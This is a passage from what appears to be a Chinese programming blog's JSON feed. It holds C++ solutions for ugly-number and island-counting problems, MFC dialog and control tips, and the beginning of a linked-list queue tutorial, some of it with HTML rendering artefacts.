punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> num5<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>                        <span class=\"token comment\">// 判断该最小值是否由因数 2 得到</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                p5<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> dp<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"xxxxxxxxxx49-1class-solution-2public3-int-numislandsvectorvectorchar-grid-4-int-mgridsizengrid0size5-ifm0-6-return-07-int-ans08-forint-i0imi9-10-forint-j0jnj11-12-ifgridij113-14-ans15-gridij016-queuepairintints17-spushij18-whilesempty19-20-auto-rcsfront21-spop22-ifr-10gridr-1c123-24-gridr-1c025-spushr-1c26-27-ifr1mgridr1c128-29-gridr1c030-spushr1c31-32-ifc-10gridrc-1133-34-gridrc-1035-spushrc-136-37-ifc1ngridrc1138-39-gridrc1040-spushrc141-4243-44-45-46-47-return-ans48-49cpp-广度优先搜索4\"><a class=\"anchor\" href=\"#xxxxxxxxxx49-1class-solution-2public3-int-numislandsvectorvectorchar-grid-4-int-mgridsizengrid0size5-ifm0-6-return-07-int-ans08-forint-i0imi9-10-forint-j0jnj11-12-ifgridij113-14-ans15-gridij016-queuepairintints17-spushij18-whilesempty19-20-auto-rcsfront21-spop22-ifr-10gridr-1c123-24-gridr-1c025-spushr-1c26-27-ifr1mgridr1c128-29-gridr1c030-spushr1c31-32-ifc-10gridrc-1133-34-gridrc-1035-spushrc-136-37-ifc1ngridrc1138-39-gridrc1040-spushrc141-4243-44-45-46-47-return-ans48-49cpp-广度优先搜索4\">#</a> xxxxxxxxxx49&nbsp;1class Solution {2public:3 &nbsp; &nbsp;int numIslands(vector&lt;vector&lt;char&gt;&gt;&amp; grid) {4 &nbsp; &nbsp; &nbsp; &nbsp;int m=grid.size(),n=grid[0].size();5 &nbsp; &nbsp; &nbsp; &nbsp;if(m<mark>0) &nbsp;6 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return 0;7 &nbsp; &nbsp; &nbsp; &nbsp;int ans=0;8 &nbsp; &nbsp; &nbsp; &nbsp;for(int i=0;i&lt;m;i++)9 &nbsp; &nbsp; &nbsp;  {10 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;for(int j=0;j&lt;n;j++)11 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  {12 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if(grid[i][j]</mark>'1')13 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  {14 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ans++;15 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;grid[i][j]='0';16 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;queue&lt;pair&lt;int,int&gt;&gt;s;17 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s.push({i,j});18 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;while(!s.empty())19 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  {20 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;auto [r,c]=s.front();21 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s.pop();22 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if(r-1&gt;=0&amp;&amp;grid[r-1][c]<mark>'1')23 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  {24 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;grid[r-1][c]='0';25 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s.push({r-1,c});26 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }27 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if(r+1&lt;m&amp;&amp;grid[r+1][c]</mark>'1')28 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  {29 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;grid[r+1][c]='0';30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s.push({r+1,c});31 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }32 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if(c-1&gt;=0&amp;&amp;grid[r][c-1]<mark>'1')33 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  { &nbsp; &nbsp;34 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;grid[r][c-1]='0';35 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s.push({r,c-1});36 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }37 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;if(c+1&lt;n&amp;&amp;grid[r][c+1]</mark>'1') 38 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  {39 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;grid [r][c+1]='0';40 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;s.push ({r,c+1});41 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } 42​43 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } 44 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } 45 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } 46 &nbsp; &nbsp; &nbsp;  } 47 &nbsp; &nbsp; &nbsp; &nbsp;return ans;48 &nbsp;  } 49};cpp  广度优先搜索 4</h1>\n<p>题目链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWV0Y29kZS1jbi5jb20vcHJvYmxlbXMvc3VwZXItdWdseS1udW1iZXIv\"> 超级丑数</span></p>\n<p>题目详情：</p>\n<p><img data-src=\"../../../post_images/%E8%B6%85%E7%BA%A7%E4%B8%91%E6%95%B0_%E9%A2%98%E7%9B%AE%E8%AF%A6%E6%83%85.png\" alt=\"超级丑数_题目详情\"></p>\n<p>这题与与丑数 II 十分相似，不同的是，因数集不在是固定为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">[</mo><mn>2</mn><mo separator=\"true\">,</mo><mn>3</mn><mo separator=\"true\">,</mo><mn>5</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">[2,3,5]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">3</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">5</span><span class=\"mclose\">]</span></span></span></span>，而是由给定的数组决定。</p>\n<p>同样的沿用丑数 II 的思想，在丑数 II 中，首先需要存储丑数的数组 dp，同时用于实现动态规划思想，其次需要有记录各因数应乘丑数的下标和记录目前丑数集的<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mi>u</mi><mi>m</mi></mrow><annotation encoding=\"application/x-tex\">num</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">m</span></span></span></span></p>\n<p>因此需要的变量为：</p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>d</mi><mi>p</mi><mo stretchy=\"false\">[</mo><mi>n</mi><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">dp[n]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">]</span></span></span></span> 存储丑数</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mi>o</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy=\"false\">[</mo><mi>i</mi><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">point[i]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">t</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">]</span></span></span></span> 记录因数<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mi>r</mi><mi>i</mi><mi>m</mi><mi>e</mi><mi>s</mi><mo stretchy=\"false\">[</mo><mi>i</mi><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">primes[i]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">]</span></span></span></span> 应乘的丑数下标</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mi>u</mi><mi>m</mi><mi>s</mi><mo stretchy=\"false\">[</mo><mi>i</mi><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">nums[i]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">s</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">]</span></span></span></span> 存储丑数集，其中下标<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 对应因数下标<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.65952em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span></li>\n</ul>\n<p>代码如下:</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"><span>超级丑数</span></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> <span class=\"token function\">nthSuperUglyNumber</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">,</span> vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&amp;</span> primes<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">&gt;</span><span class=\"token function\">point</span><span class=\"token punctuation\">(</span>primes<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t<span class=\"token comment\">// 使用 long 防止数据溢出，因为虽然题目保证第 n 各数不会超出 32-bit，</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token comment\">// 但我们在使用该方法时是找已知丑数的最小值，因此可能超过 32-bit</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">long</span><span class=\"token operator\">&gt;</span><span class=\"token function\">nums</span><span class=\"token punctuation\">(</span>primes<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">long</span><span class=\"token operator\">&gt;</span><span class=\"token function\">dp</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;=</span>n<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">long</span> minn<span class=\"token operator\">=</span>INT_MAX<span class=\"token punctuation\">;</span>             <span class=\"token comment\">// 用于找到丑数集中的最小数</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span>nums<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>                minn<span class=\"token operator\">=</span><span class=\"token function\">min</span><span class=\"token punctuation\">(</span>minn<span class=\"token punctuation\">,</span>nums<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            dp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>minn<span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// 放入存储丑数的数组中</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span>nums<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>minn<span class=\"token operator\">==</span>nums<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>         <span class=\"token comment\">// 表示目前找到的最小丑数可以有因数 primes [j] 得到</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    point<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// 对应丑数小标加 1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                    nums<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>dp<span class=\"token punctuation\">[</span>point<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>primes<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// 更新丑数集</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">return</span> dp<span class=\"token punctuation\">[</span>n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure>",
            "tags": [
                "动态规划"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/c3305e01/",
            "url": "http://dpm12345.cn/posts/c3305e01/",
            "title": "MFC 相关操作汇总",
            "date_published": "2022-01-08T04:07:26.000Z",
            "content_html": "<h2 id=\"edit-编辑框文本不覆盖\"><a href=\"#edit-编辑框文本不覆盖\" class=\"headerlink\" title=\"edit 编辑框文本不覆盖\"></a>edit 编辑框文本不覆盖</h2><p>edit框如果使用 $变量名.SetWindowTextW()$</p>\n<p>那么edit框内的内容就会被覆盖</p>\n<p>如果想要追加内容，可采用以下代码</p>\n<p>假设edit框关联的变量名为$outcome$</p>\n<pre><code class=\"c++\">outcome.SetSel(-1);        // 定位到文末\noutcome.ReplaceSel(TEXT(\"读取文件失败\\r\\n\"));     // 输出并换行\n</code></pre>\n<h2 id=\"使用按钮选择文件并获取路径\"><a href=\"#使用按钮选择文件并获取路径\" class=\"headerlink\" title=\"使用按钮选择文件并获取路径\"></a>使用按钮选择文件并获取路径</h2><p>在进行选择相关文件的相关操作时，如果想要在弹出的一个对话框内选择文件，并且能够获取到路径名，那么可以使用以下代码</p>\n<pre><code class=\"c++\">CString filename;           // 保存路径\nCFileDialog opendlg(TRUE, _T(\"*\"), _T(\"\"), OFN_OVERWRITEPROMPT, _T(\"所有文件(*.*;)|*.*||\"), NULL);\nif (opendlg.DoModal() == IDOK)\n{\n    filename = opendlg.GetPathName();\n}\n</code></pre>\n<p>这一段代码结束后，filename就存储了文件的路径</p>\n<h2 id=\"修改控件的字体及大小\"><a href=\"#修改控件的字体及大小\" class=\"headerlink\" title=\"修改控件的字体及大小\"></a>修改控件的字体及大小</h2><p>首先要为控件关联一个变量，假设该变量名为 text</p>\n<p>然后定义一个 CFont 类型的 font，用于创建一个字体</p>\n<p>使用<code>font.CreatePointFont(\"100\",\"楷体\")</code>其中100为字体大小，楷体为字体类型</p>\n<p>创建好字体后，便使用<code>$SetFont()</code>函数，将font的地址作为参数</p>\n<p>那么代码即为</p>\n<pre><code class=\"c++\">CFont font;\nfont.CreatePointFont(100, _T(\"楷体\"));\ntext.SetFont(&amp;font);\n</code></pre>\n<h2 id=\"修改控件颜色\"><a href=\"#修改控件颜色\" class=\"headerlink\" title=\"修改控件颜色\"></a>修改控件颜色</h2><p>右键对话框，点击类向导，在出现的对话框内，选择消息，找到其中的<code>WM_CTLCOLOR</code>，并添加处理程序</p>\n<p><img data-src=\"/../../post_images/MFC_color_1.png\"></p>\n<p><img data-src=\"/../../post_images/MFC_color_2.png\"></p>\n<p>在程序中找到该成员函数实现</p>\n<p><img data-src=\"/../../post_images/MFC_color_3.png\"></p>\n<p>在代码中写上如下代码</p>\n<pre><code class=\"c++\">if (pWnd-&gt;GetDlgCtrlID() == IDC_Display)// IDC_Display 为所选文本框 ID, 如果想选择其他控件则可以改为相应的 ID\n{\n\n    pDC-&gt;SetTextColor(RGB(255, 0, 0));// 设置字体颜色\n\n    pDC-&gt;SetBkColor(RGB(0, 255, 0));// 设置背景颜色\n \n    //pDC-&gt;SetBkMode (TRANSPARENT);// 设置背景透明\n\n}\n</code></pre>\n<p>上面是针对指定控件来修改的，同时也可以对指定空间类型进行修改</p>\n<pre><code class=\"c++\">if (nCtlColor == CTLCOLOR_STATIC)   //CTLCOLOR_STATIC 为控件类型\n{\n    pDC-&gt;SetTextColor(RGB(0, 255, 0));// 设置字体颜色\n    pDC-&gt;SetBkColor(RGB(255, 0, 0));// 设置背景颜色\n}\n</code></pre>\n<p>支持的控件类型如下:</p>\n<ul>\n<li>CTLCOLOR_BTN 按钮控件 </li>\n<li>CTLCOLOR_DLG 对话框 </li>\n<li>CTLCOLOR_EDIT 编辑框 </li>\n<li>CTLCOLOR_LISTBOX 列表控件 </li>\n<li>CTLCOLOR_MSGBOX 消息控件 </li>\n<li>CTLCOLOR_SCROLLBAR 滚动条控件 </li>\n<li>CTLCOLOR_STATIC 静态控件</li>\n</ul>\n",
            "tags": [
                "MFC"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/3140d327/",
            "url": "http://dpm12345.cn/posts/3140d327/",
            "title": "队列实现",
            "date_published": "2022-01-04T02:07:26.000Z",
            "content_html": "<h1 id=\"队列的实现\"><a href=\"#队列的实现\" class=\"headerlink\" title=\"队列的实现\"></a>队列的实现</h1><p>该实现使用的是C++的函数模板</p>\n<h2 id=\"队列的特点\"><a href=\"#队列的特点\" class=\"headerlink\" title=\"队列的特点\"></a>队列的特点</h2><p>与栈有些许类似，将数据放入队列中时，放入的位置是队尾，但弹出$pop()$ 操作时，是将队头元素删去，并且队列可以通过$[$ $]$来访问数据，故可知实现的函数功能有以下:</p>\n<ul>\n<li><p>void push(T val); // 入队</p>\n</li>\n<li><p>void pop(); // 出队</p>\n</li>\n<li><p>T back(); // 返回队尾元素</p>\n</li>\n<li><p>T front(); // 返回队首元素</p>\n</li>\n<li><p>void operator=(const Queue<t>&amp; q); // 重载 = 运算符</t></p>\n</li>\n<li><p>void print(); // 打印队列</p>\n</li>\n<li><p>bool empty(); // 判断是否为空</p>\n</li>\n<li><p>int size(); // 返回队列大小</p>\n</li>\n</ul>\n<h2 id=\"实现之前的思考\"><a href=\"#实现之前的思考\" class=\"headerlink\" title=\"实现之前的思考\"></a>实现之前的思考</h2><p>由上面的实现功能列表，可以清楚此时队列中的元素增删分别是在尾部和头部来进行的 如果存储数据的是数组，增加数据时还好，可以直接添加，如果是删去元素，那么为了确保队列前面都有人存在(不为循环队列), 必须分别将各个元素慢慢地向前挪，效率较慢。注意到队列的增删操作与链表的尾插和头删相同，而链表的尾插和头删比较简单，因此 此实现采用链表来存储数据</p>\n<h2 id=\"结点构造\"><a href=\"#结点构造\" class=\"headerlink\" title=\"结点构造\"></a>结点构造</h2><p>由于采用的是链表来存储数据，所以直接按照链表格式创建结点即可</p>\n<pre><code class=\"c++\">template&lt;class T&gt;\nstruct node{\n    T data;\n    node&lt;T&gt;* next;\n};\n</code></pre>\n<h2 id=\"Queue-类\"><a href=\"#Queue-类\" class=\"headerlink\" title=\"Queue 类\"></a>Queue 类</h2><h3 id=\"函数成员\"><a href=\"#函数成员\" class=\"headerlink\" title=\"函数成员\"></a>函数成员</h3><p>在队列的实现中，我们要进行头删，尾插，并且可以通过$[$ $]$来访问数据，故需要的数据分别为头结点地址、尾结点地址(方便进行尾插)、链表的元素个数</p>\n<p>而函数成员即为实现功能所列</p>\n<p>所以整体结构为：</p>\n<pre><code class=\"c++\">template&lt;class T&gt;\nclass Queue{\nprivate:\n    node&lt;T&gt;* head;         // 头结点\n    node&lt;T&gt;* tail;         // 尾结点\n    int num;\npublic:\n    Queue();                              // 无参构造函数\n    Queue(T val);                         // 有参构造函数\n    ~Queue();                             // 析构函数\n    Queue(const Queue&lt;T&gt;&amp; q);             // 复制构造函数\n    void push(T val);                     // 入队\n    void pop();                           // 出队\n    T back();                             // 返回队尾元素\n    T front();                            // 返回队首元素\n    void operator =(const Queue&lt;T&gt;&amp; q);   // 重载 = 运算符\n    void print();                         // 打印队列\n    bool empty();                         // 判断是否为空\n    int size();                           // 返回队列大小\n\n};\n</code></pre>\n<h3 id=\"成员函数实现\"><a href=\"#成员函数实现\" class=\"headerlink\" title=\"成员函数实现\"></a>成员函数实现</h3><h4 id=\"构造函数\"><a href=\"#构造函数\" class=\"headerlink\" title=\"构造函数\"></a>构造函数</h4><p>在上面，拟定为两种构造函数形式，无参和有参，两种方式做的工作一样，目的是对数据进行初始化。</p>\n<p>如果是无参，$head$和$tail$都应指向空，而$num=0$, 如果是有参，那么新建一个结点后，$head$ 和$tail$ 都指向它，$num=1$</p>\n<p>由于涉及指针，故需要深复制，重写复制构造函数</p>\n<p>以下为实现代码：</p>\n<pre><code class=\"c++\">// 无参构造函数\ntemplate&lt;class T&gt;\nQueue&lt;T&gt;::Queue()\n{\n    head = tail = nullptr;\n    num = 0;\n}\n\n// 有参构造函数\ntemplate&lt;class T&gt;\nQueue&lt;T&gt;::Queue(T val)\n{\n    node&lt;T&gt;* newnode = new node&lt;T&gt;;\n    newnode-&gt;data = val;\n    newnode-&gt;next = nullptr;\n    head = tail = newnode;\n    num = 